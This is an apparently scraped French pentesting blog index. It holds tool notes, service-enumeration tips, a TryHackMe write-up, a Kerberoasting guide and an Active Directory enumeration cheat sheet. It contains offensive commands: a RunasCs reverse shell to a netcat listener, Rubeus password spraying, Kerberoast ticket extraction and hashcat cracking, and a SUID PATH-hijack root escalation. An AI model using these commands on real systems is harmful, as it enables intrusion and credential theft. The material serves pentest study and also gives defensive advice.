acc√®s.\nhttps://learn.microsoft.com/en-us/sysinternals/downloads/psexec\npsexec.py /:@[[username-anarchyPublic]]\n","permalink":"https://nyobemichel.me/posts/outils/psexec-v2.43/","summary":"PsExec v2.43","title":"PsExec v2.43"},{"content":"LLMNR/NBT-NS/mDNS Poisoner\n","permalink":"https://nyobemichel.me/posts/outils/responder/","summary":"Responder","title":"Responder"},{"content":"Rubeus est un outil puissant pour attaquer Kerberos. Adapt√© de l\u0026rsquo;outil Kekeo, Rubeus propose une grande vari√©t√© d\u0026rsquo;attaques et de fonctionnalit√©s qui en font un outil tr√®s polyvalent pour attaquer Kerberos. Parmi ses nombreux outils et attaques, on peut citer le d√©passement de hachage, les demandes et renouvellements de tickets, la gestion et l\u0026rsquo;extraction de tickets, la collecte, la transmission de tickets, l\u0026rsquo;AS-REP Roasting et le Kerberoasting. https://github.com/GhostPack/Rubeus\nR√©colte de Tickets Rubeus.exe harvest /interval:30 Cette commande indique a Rubeux de recolter des TGT toutes les 30 secondes\nForce Brute / Pulverisation de mot de passe Cette attaque utilise un mot de passe Kerberos donn√©, le diffuse sur tous les utilisateurs d√©tect√©s et g√©n√®re un ticket .kirbi. Ce ticket est un TGT permettant d\u0026rsquo;obtenir des tickets de service aupr√®s du KDC, ainsi que dans des attaques telles que l\u0026rsquo;attaque par transfert de ticket.\nRubeus.exe brute /password:Password1 /noticket Cela prendra un mot de passe donn√© et le ¬´ vaporisera ¬ª sur tous les utilisateurs trouv√©s, puis donnera le¬†TGT¬†.kirbi pour cet utilisateur\n","permalink":"https://nyobemichel.me/posts/outils/rubeus/","summary":"Rubeus","title":"Rubeus"},{"content":"./RunasCs.exe \u0026lsquo;M.schoolbus\u0026rsquo; \u0026lsquo;\u0026rsquo; powershell.exe -r \u0026lt;nc_IP\u0026gt;:\u0026lt;nc_Port\u0026gt;\n","permalink":"https://nyobemichel.me/posts/outils/runascs/","summary":"Runascs","title":"Runascs"},{"content":"Utiliser le fichier avec sqlmap :\nsqlmap -r requete.txt --dump --batch ","permalink":"https://nyobemichel.me/posts/outils/sqlmap/","summary":"SQLMAp","title":"SQLMAp"},{"content":"sshuttle¬†: l√† o√π le proxy transparent rencontre le VPN et SSH Autant que je sache, sshuttle est le seul programme qui r√©sout le cas courant suivant¬†:\nVotre machine cliente (ou routeur) est Linux, FreeBSD, MacOS ou Windows. Vous avez acc√®s √† un r√©seau distant via ssh. Vous n‚Äôavez pas n√©cessairement acc√®s administrateur sur le r√©seau distant. Le r√©seau distant n\u0026rsquo;a pas de VPN, ou seulement des protocoles VPN complexes (IPsec, PPTP, etc.). Ou peut-√™tre¬†√™tes-¬†vous l\u0026rsquo;administrateur et √™tes-vous simplement frustr√© par l\u0026rsquo;√©tat lamentable des outils VPN¬†? Vous ne souhaitez pas cr√©er une redirection de port SSH pour chaque h√¥te/port du r√©seau distant. Vous d√©testez la redirection de port d\u0026rsquo;OpenSH parce qu\u0026rsquo;elle est al√©atoirement lente et/ou stupide. Vous ne pouvez pas utiliser la fonctionnalit√© PermitTunnel d\u0026rsquo;OpenSH car elle est d√©sactiv√©e par d√©faut sur les serveurs OpenSH¬†; de plus, elle utilise TCP-over-TCP, ce qui a¬†des performances terribles¬†. ","permalink":"https://nyobemichel.me/posts/outils/sshuttle/","summary":"sshuttle","title":"sshuttle"},{"content":"Outils permettant de g√©n√©rer des noms d\u0026rsquo;utilisateur lors de tests de p√©n√©tration.¬†_Les noms d\u0026rsquo;utilisateur repr√©sentent la moiti√© du probl√®me de force brute des mots de passe.\n./username-anarchy --input-file Names.txt --select-format first.last,firstl,f.last,flast \u0026gt; Usernames.txt https://github.com/urbanadventurer/username-anarchy\n","permalink":"https://nyobemichel.me/posts/outils/username-anarchypublic/","summary":"username-anarchyPublic","title":"username-anarchyPublic"},{"content":" The version of WordPress installed and any associated vulnerabilities What plugins are installed and any associated vulnerabilities What themes are installed and any associated vulnerabilities Username enumeration Users with weak passwords via password brute forcing Backed up and publicly accessible wp-config.php files Database dumps that may be publicly accessible If error logs are exposed by plugins Media file enumeration Vulnerable Timthumb files If the WordPress readme file is present If WP-Cron is enabled If user registration is enabled Full Path Disclose Upload directory listing https://github.com/wpscanteam/wpscan/wiki/WPScan-User-Documentation ","permalink":"https://nyobemichel.me/posts/outils/wpscan/","summary":"WPscan","title":"WPscan"},{"content":"Le protocole FTP¬†File Transfer Protocol(¬†FTP) est l\u0026rsquo;un des plus anciens protocoles d\u0026rsquo;Internet. Il s\u0026rsquo;ex√©cute au sein de la couche application de la pile de protocoles TCP/IP. Port 21\nQuelques Commande FTP\nget , Connect , put , quit , status , verbose\nft $IP Telecharger tous les fichiers disponibles\nwget -m --no-passive ftp://anonymous:anonymous@10.129.14.13 Trouver tous les scripts ftp Nmap\nfind / -type f -name ftp* 2\u0026gt;/dev/null | grep scripts TFTP Trivial File Transfer Protocol(¬†TFTP) est plus simple que FTP et effectue des transferts de fichiers entre les processus client et serveur.\nhttps://web.archive.org/web/20230326204635/https://www.smartfile.com/blog/the-ultimate-ftp-commands-list/\n","permalink":"https://nyobemichel.me/posts/enumeration/enumeration---ftp/","summary":"FTP","title":"Enumeration - FTP"},{"content":"Network File System(¬†NFS) est un syst√®me de fichiers r√©seau d√©velopp√© par Sun Microsystems et dont l\u0026rsquo;objectif est le m√™me que SMB.\nsudo nmap --script nfs* $ip$ -sV -p111,2049 Afficher les partage NFS Disponible\nshowmount -e 10.129.14.128 Montage du partage NFS\nmkdir target-NFS sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock cd target-NFS tree . ","permalink":"https://nyobemichel.me/posts/enumeration/enumeration---nfs/","summary":"NFS","title":"Enumeration - NFS"},{"content":"Definition Server Message Block ( SMB ) est un protocole de communication utilis√© pour partager des fichiers, des imprimantes , des ports s√©rie et diverses communications entre les n≈ìuds d\u0026rsquo;un r√©seau. port SMB 139 445\ntools smbclient\nL : list des partages sur la machines -U : user smbmap H : user crackmapexec smb 192.168.1.17 -u \u0026lsquo;raj\u0026rsquo; -p \u0026lsquo;123\u0026rsquo; \u0026ndash;shares \u0026ndash;users\nsudo nmap $ip$ -sV -sC -p139,445 rpcclient -U \u0026#34; \u0026#34; $ip Le¬†rpcclientclient rpc propose de nombreuses requ√™tes permettant d\u0026rsquo;ex√©cuter des fonctions sp√©cifiques sur le serveur SMB pour obtenir des informations srvinfo , enumdomains, querydominfo, netshareenumall , netsharegetinfo , enumdomusers , queryuser Impacket - Samrrdump.py\nsmbmap -H $ip https://fr.wikipedia.org/wiki/Server_Message_Block\n","permalink":"https://nyobemichel.me/posts/enumeration/enumeration---smb/","summary":"SMB","title":"Enumeration - SMB"},{"content":"Le protocole¬†Simple Mail Transfer Protocol(¬†SMTP) permet d\u0026rsquo;envoyer des e-mails sur un r√©seau IP. Il peut √™tre utilis√© entre un client de messagerie et un serveur de courrier sortant, ou entre deux serveurs SMTP Par d√©faut, les serveurs SMTP acceptent les demandes de connexion sur le port¬†25 Pour interagir avec le serveur SMTP, nous pouvons utiliser l\u0026rsquo;¬†telnetoutil pour initialiser une connexion TCP. L\u0026rsquo;initialisation de la session s\u0026rsquo;effectue avec la commande mentionn√©e ci-dessus,¬†HELOou¬†EHLO.\\\ntelnet IP_ADRESS 25 sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v smtp-user-enum smtp-user-enum -M VRFY -U /usr/share/seclists/Discovery/SNMP/snmp.txt -t 10.129.1.62 https://serversmtp.com/smtp-error/\n","permalink":"https://nyobemichel.me/posts/enumeration/enumeration---smtp/","summary":"SMTP","title":"Enumeration - SMTP"},{"content":"Outils\nCrackmapexec netexec smbclient rpcclient ldapsearch ldapsearch -x -H ldap://10.10.11.75 -D \u0026#39;name\u0026#39; -w \u0026#39;password\u0026#39; -b \u0026#34;dc=rustykey,dc=htb\u0026#34; \u0026#34;(objectClass=user)\u0026#34; userPrincipalName ","permalink":"https://nyobemichel.me/posts/enumeration/enumeration-ad---externe/","summary":"SMTP","title":"Enumeration - SMTP"},{"content":"1. Phase de pr√©-engagement La phase de pr√©-engagement est cruciale car elle pose les bases de l\u0026rsquo;ensemble du test de p√©n√©tration. Au cours de cette phase, les testeurs de p√©n√©tration travaillent en √©troite collaboration avec le client pour comprendre ses besoins, ses pr√©occupations et ses objectifs sp√©cifiques. Cela comprend la d√©finition de la port√©e du test, l\u0026rsquo;√©tablissement des √©ch√©anciers et la d√©termination des syst√®mes et des r√©seaux qui seront test√©s.\n2. Phase de collecte d\u0026rsquo;informations La collecte d\u0026rsquo;informations, √©galement appel√©e reconnaissance ou collecte de renseignements, consiste √† recueillir autant d\u0026rsquo;informations pertinentes que possible sur la cible. Cette phase peut √™tre divis√©e en reconnaissance passive et active.\nPassive reconnaissanceimplique la collecte d\u0026rsquo;informations sans interaction directe avec les syst√®mes cibles. Cela peut inclure l\u0026rsquo;analyse de documents publics, la recherche sur les r√©seaux sociaux, l\u0026rsquo;examen des sites Web d\u0026rsquo;entreprises et l\u0026rsquo;utilisation d\u0026rsquo;outils OSINT (Open Source Intelligence). Cette approche ne laisse aucune trace et ne pr√©sente aucun risque pour l\u0026rsquo;infrastructure cible.\nActive reconnaissance, d\u0026rsquo;autre part, implique une interaction directe avec les syst√®mes cibles. Cela inclut des activit√©s telles que l\u0026rsquo;analyse des ports, l\u0026rsquo;√©num√©ration des services et la capture de banni√®res. Bien que plus intrusive, cette m√©thode fournit des informations techniques d√©taill√©es sur l\u0026rsquo;environnement cible.\n3. Phase d‚Äô√©valuation de la vuln√©rabilit√© Au cours de la phase d\u0026rsquo;√©valuation des vuln√©rabilit√©s, les testeurs de p√©n√©tration¬†analyse les informations se sont r√©unis pour identifier les faiblesses potentielles en mati√®re de s√©curit√©. Cela implique l\u0026rsquo;utilisation de divers outils d\u0026rsquo;analyse automatis√©s et de techniques de test manuel pour d√©couvrir les vuln√©rabilit√©s des syst√®mes, des applications et de l\u0026rsquo;infrastructure r√©seau.\n4. Phase d\u0026rsquo;exploitation La phase d\u0026rsquo;exploitation est celle o√π les testeurs de p√©n√©tration tentent d\u0026rsquo;exploiter¬†les vuln√©rabilit√©s identifi√©es lors de la phase pr√©c√©dente. Cela permet de d√©montrer l\u0026rsquo;impact r√©el des faiblesses de s√©curit√© et d\u0026rsquo;√©tablir ce qu\u0026rsquo;un attaquant r√©el pourrait √™tre en mesure d\u0026rsquo;accomplir.\nLors de l\u0026rsquo;exploitation, les testeurs doivent documenter soigneusement leurs activit√©s et conserver un enregistrement pr√©cis des syst√®mes auxquels ils ont acc√©d√©. Il est essentiel de respecter les r√®gles d\u0026rsquo;engagement convenues et d\u0026rsquo;√©viter de causer des dommages aux syst√®mes de production. Les testeurs qualifi√©s cr√©ent souvent des cha√Ænes d\u0026rsquo;attaque d√©taill√©es, montrant comment plusieurs vuln√©rabilit√©s peuvent √™tre combin√©es pour obtenir un acc√®s plus approfondi.\n5. Phase post-exploitation Une fois l\u0026rsquo;acc√®s initial obtenu, la phase de post-exploitation commence. Cette phase comprend des activit√©s telles que l\u0026rsquo;escalade des privil√®ges, le mouvement lat√©ral √† travers le r√©seau, les tests d\u0026rsquo;exfiltration de donn√©es et le maintien de la persistance. L\u0026rsquo;objectif est de comprendre l\u0026rsquo;√©tendue compl√®te de ce qu\u0026rsquo;un attaquant pourrait accomplir apr√®s avoir franchi les d√©fenses initiales.\n6. Phase de mouvement lat√©ral Le mouvement lat√©ral consiste √† naviguer dans le r√©seau apr√®s avoir obtenu un acc√®s initial pour d√©couvrir des syst√®mes, des ressources et des cibles potentielles suppl√©mentaires. Cette phase se concentre sur l\u0026rsquo;identification et l\u0026rsquo;exploitation des relations de confiance entre les syst√®mes et sur l\u0026rsquo;√©largissement de la pr√©sence du testeur de p√©n√©tration au sein du r√©seau.\n7. Preuve de concept La phase de preuve de concept consiste √† cr√©er¬†un document detaille des preuves des preuves d√©montrant comment les vuln√©rabilit√©s ont √©t√© exploit√©es. Cela comprend le d√©veloppement de m√©thodes fiables et reproductibles pour reproduire les probl√®mes de s√©curit√© identifi√©s, ce qui permet de valider les r√©sultats et d\u0026rsquo;aider l\u0026rsquo;√©quipe technique du client √† comprendre et √† corriger les vuln√©rabilit√©s.\n8. Phase post-engagement La phase de reporting est essentielle car elle¬†permet de compiler les r√©sultats techniques¬†actionable information for the client. Un rapport de test de p√©n√©tration bien r√©dig√© comprend g√©n√©ralement un r√©sum√© destin√© √† la direction, des r√©sultats techniques d√©taill√©s destin√©s √† l\u0026rsquo;√©quipe informatique et des recommandations claires pour la correction.\n9. Assistance √† la rem√©diation et nouveaux tests Apr√®s la remise du rapport, de nombreuses missions de tests d\u0026rsquo;intrusion incluent une p√©riode de support de correction. Pendant cette p√©riode, les testeurs se rendent disponibles pour r√©pondre aux questions sur leurs conclusions et fournir des conseils suppl√©mentaires sur la mise en ≈ìuvre des correctifs.\n","permalink":"https://nyobemichel.me/posts/structure-test-penetration/","summary":"Un aper√ßu des phases lors d\u0026rsquo;un test d‚Äôintrusion","title":"structure test penetration"},{"content":"Avant de se lancer dans un test de p√©n√©tration, plusieurs¬†crucial prerequisites√©l√©ments doivent √™tre √©tablis pour garantir un engagement r√©ussi, l√©gal et professionnel. Ces √©l√©ments fondamentaux prot√®gent √† la fois le testeur de p√©n√©tration et le client tout en maximisant la valeur de l\u0026rsquo;√©valuation. Ces √©l√©ments peuvent √™tre, sans s\u0026rsquo;y limiter :\nAutorisation l√©gale et documentation D√©finition et limites du champ d\u0026rsquo;application Collecte d\u0026rsquo;informations Canaux de communication et proc√©dures d\u0026rsquo;urgence Pr√©paration de l\u0026rsquo;environnement de test Consid√©rations relatives √† la sauvegarde et √† la r√©cup√©ration Documentation et rapports Responsabilit√© professionnelle et assurance Confidentialit√© et traitement des donn√©es Autorisation l√©gale et documentation La pierre angulaire de toute mission de test de p√©n√©tration est une autorisation l√©gale appropri√©e. Cela commence par un accord √©crit formel, souvent appel√©¬†Statement of Work(¬†SoW) ou¬†Master Services Agreement(¬†MSA). Un MSA est souvent utilis√© lorsqu\u0026rsquo;il existe une relation continue entre le client et le prestataire de services de test de p√©n√©tration. Il d√©crit les conditions g√©n√©rales de la relation commerciale\nM√©thodologies de test de p√©n√©tration de base Penetration Testing Execution Standard La m√©thodologie la plus largement reconnue dans le domaine des tests de p√©n√©tration est la¬†Penetration Testing Execution Standard¬†.¬†La PTES fournit un cadre qui divise le processus de test de p√©n√©tration en sept phases distinctes : interactions avant engagement, collecte de renseignements, mod√©lisation des menaces, analyse des vuln√©rabilit√©s, exploitation, post-exploitation et reporting. http://www.pentest-standard.org/index.php/Main_Page\nLe¬†Technical Guide to Information Security Testing and Assessment repr√©sente une approche plus formelle. Bien qu'il ne s'agisse pas strictement d'une m√©thodologie de test de p√©n√©tration, il fournit des conseils pr√©cieux sur la planification, l'ex√©cution et les activit√©s post-test de l'√©valuation de la s√©curit√©. Ce cadre est particuli√®rement pertinent lorsque l'on travaille avec des agences ou des organisations gouvernementales qui suivent les directives du NIST. https://www.nist.gov/privacy-framework/nist-sp-800-115\nOpen Web Application Security Project L‚ÄôOWASP WSTG se concentre sur les tests de s√©curit√© applicative web, avec des cas de test d√©taill√©s pour chaque vecteur d‚Äôattaque connu.\nhttps://owasp.org/www-project-web-security-testing-guide/stable/\nLe cadre¬†MITRE ATT\u0026amp;CK https://attack.mitre.org/\n","permalink":"https://nyobemichel.me/posts/pr%C3%A9requis-pour-un-test-de-p%C3%A9n%C3%A9tration/","summary":"Une vue d\u0026rsquo;ensemble structur√©e des pr√©requis et m√©thodologies √† ma√Ætriser avant de r√©aliser un test d‚Äôintrusion.","title":"Pr√©requis pour un test de p√©n√©tration part1"},{"content":"Enumeration Nmap Nous commen√ßons par ex√©cuter une analyse nmap sur la cible :\nLe scan nous montre que le port 22 et 80 sont ouverts.\nWebserver Je tombe sur un site web anodin :\nApr√®s √©num√©ration des r√©pertoires, je d√©couvre /spip :\nR√©f√©rence Metasploit utilis√©e :\nhttps://github.com/rapid7/metasploit-framework/pull/17711/files\nApr√®s plusieurs heures, j‚Äôai essay√© le framework Metasploit :\nPATH Injection AppArmor est un outil qui permet de restreindre un programme avec des r√®gles. Vous pouvez acc√©der √† ces informations par une simple recherche sur Google.\nJ‚Äôai eu cette indication dans la salle, je suis donc all√© examiner les fichiers AppArmor pour mieux comprendre les r√®gles :\nJ\u0026rsquo;ajoute le dossier /var/tmp, sur lequel j‚Äôai les droits d‚Äô√©criture.\nJe cr√©e ensuite un fichier binaire appel√© docker et l\u0026rsquo;autorise √† s\u0026rsquo;ex√©cuter. Ce fichier contient /bin/bash -p. Je souhaite donc utiliser la commande bash en mode privil√©gi√©.\nSi vous faites attention, lorsque j‚Äôimprime la valeur $PATH, le shell initial est ash, mais apr√®s l‚Äôop√©ration, il devient bash.\nEnsuite, je copie mon fichier docker dans /opt/run_container.sh et j\u0026rsquo;ex√©cute le binaire /usr/sbin/run_container avec le bit SUID‚Ä¶ et je suis ROOT !!!\n","permalink":"https://nyobemichel.me/posts/publisher-thm/","summary":"tryhackme","title":"Publisher - THM"},{"content":"Introduction Kerberoasting est une technique d‚Äôattaque post-exploitation qui cible les environnements Active Directory, plus pr√©cis√©ment les comptes de service prot√©g√©s par le protocole d‚Äôauthentification Kerberos.\nL‚Äôobjectif de l‚Äôattaquant est de r√©cup√©rer des tickets de service (TGS) chiffr√©s, puis de craquer hors ligne les hashs de mots de passe des comptes de service associ√©s √† des Service Principal Names (SPN). Une fois le mot de passe r√©cup√©r√©, cela peut mener √† une √©l√©vation de privil√®ges ou √† une lateralisation dans le r√©seau.\n‚öôÔ∏è Fonctionnement du protocole Kerberos (rappel rapide) Lorsqu‚Äôun utilisateur demande l‚Äôacc√®s √† un service, il envoie un TGT (Ticket Granting Ticket) valide et le nom du service (via le sname) au KDC (Key Distribution Center). Si le ticket est valide, le KDC renvoie un TGS, chiffr√© avec le hash du mot de passe du compte de service cibl√©.\nC‚Äôest cette √©tape que l‚Äôattaquant va d√©tourner pour capturer ce TGS et tenter de retrouver le mot de passe par brute force ou dictionnaire.\nüß† √âtapes de l‚Äôattaque Kerberoasting Voici le workflow typique d‚Äôune attaque Kerberoasting :\n1. Acc√®s initial L‚Äôattaquant compromet un compte d‚Äôutilisateur standard dans le domaine Active Directory.\n2. Reconnaissance Il utilise des outils pour √©num√©rer les SPN pr√©sents dans le domaine (comptes de service).\n3. Requ√™te TGS Il envoie des requ√™tes au contr√¥leur de domaine pour obtenir les tickets TGS associ√©s √† ces SPN.\n4. Extraction de tickets Il extrait les TGS localement (le syst√®me les stocke en m√©moire), √† l‚Äôaide d‚Äôoutils comme Rubeus ou Mimikatz.\n5. Crackage hors ligne Le ticket est crack√© hors ligne avec Hashcat ou John the Ripper afin de r√©v√©ler le mot de passe du compte de service.\nüîß Outils utiles Voici une liste d‚Äôoutils populaires pour mener une attaque Kerberoasting :\nRubeus (C#) Mimikatz Impacket - GetUserSPNs.py PowerView (PowerShell) Empire / Invoke-Kerberoast.ps1 Hashcat ou John pour le crackage hors ligne üí• Ex√©cution de l‚Äôattaque - Cas pratiques üéØ Kerberoasting avec Rubeus Rubeus.exe kerberoast üí£ Cracker le hash avec Hashcat hashcat -m 13100 -a 0 hash.txt wordlist.txt üêç Kerberoasting avec Impacket (GetUserSPNs.py) Lister les comptes SPN :\nGetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend Extraire le TGS chiffr√© :\nsudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.3.141 -request ‚ö° Kerberoasting avec PowerView Importer PowerView :\nImport-Module .\\PowerView.ps1 Lister les utilisateurs avec SPN :\nGet-DomainUser * -SPN | select samaccountname Extraire un TGS au format Hashcat :\nGet-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat Exporter tous les tickets vers un fichier CSV:\nGet-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\tickets.csv -NoTypeInformation üß≠ Contextes d‚Äôex√©cution possibles Une attaque Kerberoasting peut √™tre lanc√©e √† partir de diff√©rents environnements :\nüíª Windows joint au domaine, avec un shell utilisateur ou SYSTEM üêß Linux joint ou non au domaine, avec keytab ou identifiants üîê Shell distant avec runas /netonly sur Windows üß™ Via un acc√®s VPN ou une session RDP, avec des outils de pentest üõ°Ô∏è D√©tection \u0026amp; d√©fense Pour se d√©fendre contre Kerberoasting, voici quelques bonnes pratiques :\nUtiliser des mots de passe robustes et complexes pour les comptes de service √âviter les comptes de service √† privil√®ges √©lev√©s (comme Domain Admin) Impl√©menter Managed Service Accounts (MSA/gMSA) Surveiller les requ√™tes TGS en masse D√©ployer des solutions de d√©tection comportementale (EDR, SIEM, etc.) Restreindre les permissions des utilisateurs standards üìö R√©f√©rences utiles Rubeus GitHub Impacket Tools PowerView Kerberoasting Technique (MITRE ATT\u0026amp;CK) ","permalink":"https://nyobemichel.me/posts/activedirectory/kerberoasting/","summary":"Une attaque redoutable post-exploitation qui cible les services Kerberos dans les environnements Active Directory. D√©cryptons ensemble la m√©thode, les outils et les moyens de d√©fense.","title":"Kerberoasting : Attaque d'Active Directory via Kerberos"},{"content":"Comprendre les Identificateurs de S√©curit√© (SID) dans Active Directory Un identificateur de s√©curit√© (SID) est utilis√© pour identifier de mani√®re unique un principal de s√©curit√© ou un groupe de s√©curit√© dans un environnement Windows. Ces identifiants jouent un r√¥le fondamental dans la gestion des autorisations et l\u0026rsquo;authentification au sein d‚Äôun domaine Active Directory.\n1. Qu‚Äôest-ce qu‚Äôun principal de s√©curit√© ? Un principal de s√©curit√© est toute entit√© pouvant √™tre authentifi√©e par le syst√®me d‚Äôexploitation. Il peut s‚Äôagir :\nd‚Äôun compte d‚Äôutilisateur,\nd‚Äôun compte d‚Äôordinateur,\nou d‚Äôun thread ou processus ex√©cut√© dans le contexte de s√©curit√© d‚Äôun compte existant.\nChaque fois qu‚Äôun utilisateur se connecte, le syst√®me g√©n√®re un jeton d‚Äôacc√®s contenant :\nle SID de l‚Äôutilisateur,\nles droits de l‚Äôutilisateur,\net les SID des groupes auxquels l‚Äôutilisateur appartient.\nCe jeton d‚Äôacc√®s d√©finit le contexte de s√©curit√© utilis√© par l‚Äôutilisateur pour interagir avec le syst√®me.\n2. Architecture d‚Äôun SID Un SID est une structure de donn√©es binaire contenant un nombre variable de valeurs. Les premi√®res valeurs d√©crivent la structure du SID, tandis que les suivantes identifient l‚Äôautorit√©, le domaine et l‚Äôobjet.\nUne fois converti au format lisible, un SID suit g√©n√©ralement cette notation standard :\nCopierModifier\nS-R-X-Y1-Y2-Yn-1-Yn\nExemple : Le SID du groupe int√©gr√© Administrateurs est repr√©sent√© comme suit :\nCopierModifier\nS-1-5-32-544\nD√©composons ce SID :\nS : identifie qu‚Äôil s‚Äôagit d‚Äôun SID.\n1 : niveau de r√©vision.\n5 : autorit√© d‚Äôidentification (Autorit√© NT).\n32 : identifiant du domaine (Builtin).\n544 : identifiant relatif (RID) pour le groupe ¬´ Administrateurs ¬ª.\n3. SID connus Certains SID sont pr√©-d√©finis et restent constants, quel que soit l‚Äôenvironnement ou le syst√®me. Ces SID connus sont g√©n√©r√©s automatiquement lors de l‚Äôinstallation du syst√®me d‚Äôexploitation ou de la cr√©ation du domaine. Ils sont utilis√©s pour identifier :\ndes groupes g√©n√©riques (Administrateurs, Utilisateurs, etc.),\nou des comptes syst√®me standards.\nPar exemple :\nS-1-5-18 : repr√©sente le compte SYSTEM.\nS-1-5-19 : correspond au Service local.\nS-1-5-32-544 : d√©signe le groupe Administrateurs.\nR√©f√©rences Comprendre les identificateurs de s√©curit√© - Microsoft Docs ","permalink":"https://nyobemichel.me/posts/sid--identificateurs-de-s%C3%A9curit%C3%A9-/","summary":"Un identificateur de s√©curit√© (SID) est essentiel dans la gestion des acc√®s et de la s√©curit√© dans les syst√®mes Windows. D√©couvrez comment il fonctionne, son r√¥le dans l\u0026rsquo;authentification et sa structure binaire.","title":"SID ( Identificateurs de s√©curit√© )"},{"content":"üìÅ 1. Domaine et For√™ts üîç Obtenir le domaine actuel Get-Domain # PowerView Get-ADDomain # Module ActiveDirectory üåê Interroger un autre domaine Get-Domain -Domain example.local Get-ADDomain -Identity example.local üÜî R√©cup√©rer le SID du domaine Get-DomainSID (Get-ADDomain).DomainSID üñ•Ô∏è R√©cup√©rer les contr√¥leurs de domaine Get-DomainController Get-ADDomainController ü§ù Obtenir les relations d‚Äôapprobation (trusts) Get-DomainTrust Get-ADTrust üå≤ Informations sur la for√™t Get-Forest Get-ADForest üìú Lister tous les domaines d‚Äôune for√™t Get-ForestDomain (Get-ADForest).Domains üó∫Ô∏è Cartographier les fiducies d\u0026rsquo;une for√™t Get-ForestTrust Get-ADTrust -Filter \u0026#39;ms-DS-TrustForestTrustInfo -ne \u0026#34;$null\u0026#34;\u0026#39; üë§ 2. Utilisateurs üë• Liste des utilisateurs Get-DomainUser Get-ADUser -Filter * -Properties * üîç D√©tails d‚Äôun utilisateur sp√©cifique Get-DomainUser -Identity user1 -Properties * Get-ADUser -Identity user1 -Properties * üîÑ Propri√©t√©s utiles Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name üëë Membres du groupe ¬´ Enterprise Admins ¬ª Get-DomainGroupMember -Identity \u0026#34;Enterprise Admins\u0026#34; -Recurse üñ•Ô∏è Groupes locaux d\u0026rsquo;une machine (privil√®ges requis) Get-NetLocalGroup -ComputerName dcorp-dc Get-NetLocalGroup -ComputerName dcorp-dc -GroupName Administrators üîé Recherche d‚Äôacc√®s administrateur local Find-LocalAdminAccess -Verbose üîê Comptes dont le mot de passe n‚Äôexpire jamais Get-ADUser -Filter {PasswordNeverExpires -eq $true} üé≠ Comptes avec d√©l√©gation Kerberos activ√©e Get-ADUser -Filter {TrustedForDelegation -eq $true -or TrustedToAuthForDelegation -eq $true} üßæ Droits de l\u0026rsquo;utilisateur actuel whoami /priv üë™ 3. Groupes üìã Lister les groupes Get-DomainGroup Get-ADGroup -Filter * -Properties * üîç Rechercher des groupes contenant \u0026ldquo;admin\u0026rdquo; Get-DomainGroup *admin* Get-ADGroup -Filter \u0026#39;Name -Like \u0026#34;*admin*\u0026#34;\u0026#39; üëë Membres ¬´ Domain Admins ¬ª Get-DomainGroupMember -Identity \u0026#34;Domain Admins\u0026#34; -Recurse üñ•Ô∏è 4. Machines \u0026amp; Serveurs üìú Liste des ordinateurs Get-DomainComputer Get-ADComputer -Filter * -Properties * üîç Recherche sp√©cifique (ex. Server 2022) Get-DomainComputer -OperatingSystem \u0026#34;*Server 2022*\u0026#34; üì° Test de connectivit√© Get-ADComputer -Filter * -Properties DNSHostName | % { Test-Connection -Count 1 -ComputerName $_.DNSHostName } üëÅÔ∏è Localisation des sessions d‚Äôun utilisateur Find-DomainUserLocation -UserGroupIdentity \u0026#34;RDPUsers\u0026#34; üîê 5. ACL et Permissions üîç Obtenir les ACL d‚Äôun objet Get-DomainObjectAcl -SamAccountName user1 -ResolveGUIDs üß† Rechercher des ACE int√©ressants Find-InterestingDomainAcl -ResolveGUIDs üìÇ ACL sur un chemin sp√©cifique Get-PathAcl -Path \u0026#34;\\\\dcorp-dc.dollarcorp.moneycorp.local\\sysvol\u0026#34; üìÇ 6. Autres Techniques üìÇ D√©couverte de serveurs de fichiers Get-NetFileServer üìö Ressources utiles PowerView Documentation (PowerSploit) Cmdlets Active Directory Microsoft ","permalink":"https://nyobemichel.me/posts/activedirectory/enumeration-active-directory/","summary":"\u003ch2 id=\"-1-domaine-et-for√™ts\"\u003eüìÅ 1. Domaine et For√™ts\u003c/h2\u003e\n\u003ch3 id=\"-obtenir-le-domaine-actuel\"\u003eüîç Obtenir le domaine actuel\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-Domain\u003c/span\u003e                \u003cspan class=\"c\"\u003e# PowerView\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADDomain\u003c/span\u003e              \u003cspan class=\"c\"\u003e# Module ActiveDirectory\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-interroger-un-autre-domaine\"\u003eüåê Interroger un autre domaine\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-Domain\u003c/span\u003e \u003cspan class=\"n\"\u003e-Domain\u003c/span\u003e \u003cspan class=\"n\"\u003eexample\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003elocal\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADDomain\u003c/span\u003e \u003cspan class=\"n\"\u003e-Identity\u003c/span\u003e \u003cspan class=\"n\"\u003eexample\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003elocal\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-r√©cup√©rer-le-sid-du-domaine\"\u003eüÜî R√©cup√©rer le SID du 